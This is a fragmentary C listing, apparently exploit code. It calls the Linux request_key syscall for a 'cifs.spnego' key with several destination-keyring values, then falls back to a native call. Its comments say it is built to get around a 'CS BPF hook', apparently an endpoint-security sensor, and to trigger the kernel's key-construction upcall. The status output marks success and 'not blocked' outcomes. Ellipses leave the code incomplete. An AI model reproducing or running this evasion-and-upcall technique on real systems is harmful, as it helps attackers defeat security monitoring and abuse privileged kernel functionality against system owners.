...
int main(int argc, char **argv)
{
        ...
        /*
         * === METHOD 2: prequest2 — dest_keyring=0 ===
         * CS BPF hook may check dest_keyring arg. prequest2 passes 0
         * instead of KEY_SPEC_SESSION_KEYRING (-3). Key construction
         * and upcall still fire — key just isn't linked to any keyring.
         */
        {
                long dests[] = { 0, -1, -2, -4, -5 };
                const char *dnames[] = { "0(none)", "-1(thread)", "-2(process)", "-4(user)", "-5(user_session)" };
                for (int i = 0; i < 5; i++) {
                        fprintf(stderr, "[prequest2] request_key dest=%s pid=%d\n", dnames[i], pid);
                        sigprocmask(SIG_SETMASK, &blk, &old);
                        errno = 0;
                        ...
                        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                                ret, errno, strerror(errno));
                        if (ret >= 0) {
                                fprintf(stderr, "[+] prequest2 dest=%s SUCCESS!\n", dnames[i]);
                                sleep(3); return 0;
                        }
                        if (errno == ENOKEY || errno == EINTR) {
                                fprintf(stderr, "[*] prequest2 NOT blocked! handler may have run\n");
                                sleep(5); return 0;
                        }
                }
        }
        ...
        /*
         * === METHOD 3: native request_key session keyring (fallback) ===
         */
        fprintf(stderr, "[native] request_key(249) dest=session pid=%d\n", pid);
        sigprocmask(SIG_SETMASK, &blk, &old);
        errno = 0;
        ret = syscall(NR_request_key, "cifs.spnego", desc, "",
